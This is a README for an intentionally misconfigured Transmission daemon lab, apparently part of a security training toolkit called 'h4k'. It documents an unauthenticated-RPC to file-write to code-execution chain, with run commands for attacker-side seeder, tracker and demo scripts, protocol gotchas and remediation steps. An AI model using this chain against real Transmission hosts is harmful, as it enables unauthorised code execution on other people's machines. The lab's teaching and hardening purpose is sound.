# transmission-rce lab

A deliberately misconfigured Transmission daemon, used to demonstrate the
full **unauthenticated RPC → arbitrary file write → remote code execution**
chain end to end.

> **UNSAFE ON PURPOSE.** This image has an RPC interface with **no
> authentication and no IP whitelist**. It exists to teach, and to be attacked
> by `h4k`. Never expose it beyond your machine.

## What is misconfigured

`settings.json` (baked into the image):

| setting | value | why it matters |
|---|---|---|
| `rpc-authentication-required` | `false` | anyone who can reach 9091 can drive the daemon |
| `rpc-whitelist-enabled` | `false` | the RPC is not limited to localhost |
| `script-torrent-done-enabled` | `true` | the daemon executes a script when a torrent completes |
| `script-torrent-done-filename` | `/bin/sh /downloads/payload.sh` | the script does not exist yet — the attacker must deliver it |

## The chain

```
1. file write   the attacker serves a one-piece .torrent from their own
                tracker; the daemon fetches it and writes the payload into
                /downloads/payload.sh
2. execution    completing a second torrent fires the done-script hook,
                which runs /bin/sh /downloads/payload.sh
3. proof        the payload writes /downloads/rce-proof.txt, which the lab's
                file server (8080) serves back to the attacker
```

## Run it

```sh
docker build -t transmission-rce:lab labs/transmission-rce
docker run -d --name txrce --network h4k-net \
  -p 9092:9091 -p 8082:8080 transmission-rce:lab
```

* RPC: `http://127.0.0.1:9092/transmission/rpc`
* files: `http://127.0.0.1:8082/`

## Drive it

The attacker-side tooling lives in `scripts/`:

* `scripts/transmission_rpc.py` — a small Transmission RPC client
* `scripts/torrent_seeder.py` — a minimal BitTorrent seeder (one piece)
* `scripts/torrent_tracker.py` — a minimal HTTP tracker (BEP 48 bencoded
  responses — the client ignores the JSON and compact forms)

```sh
# 1. serve the tracker + the seeder (they must be reachable from the lab)
docker run -d --name h4kseeder --network h4k-net \
  -p 6882:6882 -p 6883:6883 -v /tmp/lab:/lab transmission-rce:lab \
  sh -c 'python3 -u /lab/torrent_seeder.py --host 0.0.0.0 --port 6882 \
           --payload /lab/payload.bin --name payload.sh &
         TRACKER_STYLE=bencode python3 -u /lab/torrent_tracker.py \
           --host 0.0.0.0 --port 6883 --peer 192.168.1.13:6882 --dir /lab &
         sleep 3600'

# 2. run the chain
python3 scripts/transmission_rce_demo.py --host 127.0.0.1 --rpc-port 9092 \
  --files 8082 --tracker http://192.168.1.13:6883/announce
```

## Gotchas that cost real debugging time

| gotcha | fix |
|---|---|
| the tracker must answer **bencoded** (BEP 48) | `TRACKER_STYLE=bencode` |
| the client prefers **µTP** over TCP | `session-set {"utp-enabled": false}` |
| DHT peers take precedence | `session-set {"dht-enabled": false}` |
| the handshake starts with a **length byte** | compare `header[1:20]` |
| the piece message length prefix is **9 + len** | not `1 + 9 + len` |
| message ids: bitfield **5**, unchoke **1**, piece **7** | — |
| torrent names are **sanitised** (`/` → `_`) | no path traversal; writes are flat files |

## Remediation for a real host

1. `rpc-authentication-required: true` with a strong `rpc-password`.
2. `rpc-whitelist-enabled: true` limited to `127.0.0.1`.
3. Firewall the RPC port from the LAN.
4. Keep the daemon on its own unprivileged account and its download directory
   out of any directory other services read.
